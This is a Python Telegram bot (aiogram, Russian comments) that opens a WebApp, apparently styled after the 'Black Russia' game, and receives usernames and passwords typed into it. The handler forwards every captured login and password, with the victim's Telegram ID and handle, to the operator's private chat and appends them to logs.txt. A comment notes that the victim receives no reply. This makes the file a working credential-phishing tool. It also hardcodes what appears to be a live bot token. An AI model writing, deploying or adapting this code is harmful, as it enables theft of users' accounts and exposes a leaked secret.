import asyncio
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.types import WebAppInfo, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command

# Настройка логирования (для отладки)
logging.basicConfig(level=logging.INFO)

# ===== НАСТРОЙКИ =====
BOT_TOKEN = "8951284101:AAHC1bZEf9XFTsVJhtHJx2ezQSrxCLfmlmE"          # Токен вашего бота
WEBAPP_URL = "https://black-russia-6bxo.onrender.com"  # Сюда вставьте ngrok-адрес (например, https://abc.ngrok.io)
ADMIN_ID = 8392748332                 # Сюда вставьте свой Telegram ID (число)

# ===== ИНИЦИАЛИЗАЦИЯ =====
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# ===== КОМАНДА /start (кнопка с WebApp) =====
@dp.message(Command("start"))
async def start(message: types.Message):
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(
                text="🚀 Открыть приложение",
                web_app=WebAppInfo(url=WEBAPP_URL)
            )]
        ]
    )
    await message.answer(
        "Нажмите кнопку, чтобы открыть мини‑приложение.",
        reply_markup=keyboard
    )

# ===== ОБРАБОТЧИК ДАННЫХ ИЗ WEBAPP =====
@dp.message(lambda msg: msg.web_app_data is not None)
async def handle_webapp_data(message: types.Message):
    data = message.web_app_data.data  # строка вида "action|username|password"
    try:
        parts = data.split('|')
        if len(parts) == 3:
            action, username, password = parts

            # Формируем текст лога
            log_text = (
                f"[{action.upper()}] Пользователь: {username}, Пароль: {password}, "
                f"Telegram ID: {message.from_user.id}, Username: @{message.from_user.username or 'не указан'}"
            )

            # 1️⃣ ОТПРАВКА АДМИНУ В ЛИЧКУ
            try:
                await bot.send_message(ADMIN_ID, log_text)
                logging.info(f"Сообщение админу отправлено: {log_text}")
            except Exception as e:
                logging.error(f"Не удалось отправить сообщение админу: {e}")

            # 2️⃣ ДУБЛИРОВАНИЕ В ФАЙЛ (на случай, если админ офлайн)
            with open("logs.txt", "a", encoding="utf-8") as f:
                f.write(log_text + "\n")

            # ⚠️ ПОЛЬЗОВАТЕЛЮ НИЧЕГО НЕ ОТВЕЧАЕМ — он просто видит закрытие WebApp

        else:
            logging.warning(f"Неверный формат данных от {message.from_user.id}: {data}")
    except Exception as e:
        logging.error(f"Ошибка при обработке данных: {e}")

# ===== ЗАПУСК =====
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
